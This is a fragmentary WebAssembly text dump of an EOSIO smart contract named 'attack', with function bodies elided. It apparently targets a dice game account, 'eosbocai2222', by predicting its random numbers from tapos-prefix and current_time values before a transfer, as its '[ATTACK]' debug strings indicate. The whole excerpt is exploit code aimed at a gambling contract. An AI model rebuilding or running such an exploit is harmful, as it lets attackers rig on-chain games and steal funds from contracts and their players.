(module
 ...
 (table 3 3 anyfunc)
 (elem (i32.const 0) $__wasm_nullptr $_ZN6attack2hiEymm $sn_write)
 (memory $0 1)
 ...
 (data (i32.const 96) "attacker\00")
 (data (i32.const 112) "[ATTACK]predict random num =>\00")
 (data (i32.const 144) "\n\00")
 (data (i32.const 160) "dice-noneage-\00")
 (data (i32.const 176) "-user\00")
 (data (i32.const 192) "[ATTACK]current_time=>\00")
 (data (i32.const 224) "[ATTACK]tapos-prefix=>\00")
 (data (i32.const 256) "|tapos-num=>\00")
 (data (i32.const 272) "[ATTACK] before transfer\00")
 (data (i32.const 304) "active\00")
 (data (i32.const 320) "eosbocai2222\00")
 ...
 (data (i32.const 448) "[ATTACK RANDOM]tapos-prefix=>\00")
 (data (i32.const 480) "|current_time=>\00")
 (data (i32.const 496) "|game_id=>\00")
 (data (i32.const 512) "|poll_amount=>\00")
 ...
 (func $apply (param $0 i64) (param $1 i64) (param $2 i64)
  ...
  (block $label$0
   ...
   (drop
    (call $_ZN5eosio14execute_actionI6attackS1_JymmEEEbPT_MT0_FvDpT1_E
     (i32.add
      (get_local $9)
      (i32.const 24)
     )
 ...
 (func $_ZN6attack2hiEymm (type $FUNCSIG$vijii) (param $0 i32) (param $1 i64) (param $2 i32) (param $3 i32)
  (local $4 i32)
  (local $5 i64)
  (local $6 i32)
  (local $7 i64)
 ...
 (func $_ZN5eosio14execute_actionI6attackS1_JymmEEEbPT_MT0_FvDpT1_E (param $0 i32) (param $1 i32) (result i32)
  (local $2 i32)
  (local $3 i64)
  (local $4 i32)
  (local $5 i32)
 ...
 (func $_ZN6attack6randomEyymm (param $0 i32) (param $1 i64) (param $2 i64) (param $3 i32) (param $4 i32) (result i32)
  (local $5 i32)
  (local $6 i32)
  (local $7 i32)
  (local $8 i32)
 ...
 (func $pop_arg.333 (param $0 i32) (param $1 i32) (param $2 i32)
  (local $3 i64)
  (local $4 i32)
  (i32.store offset=4
   (i32.const 0)
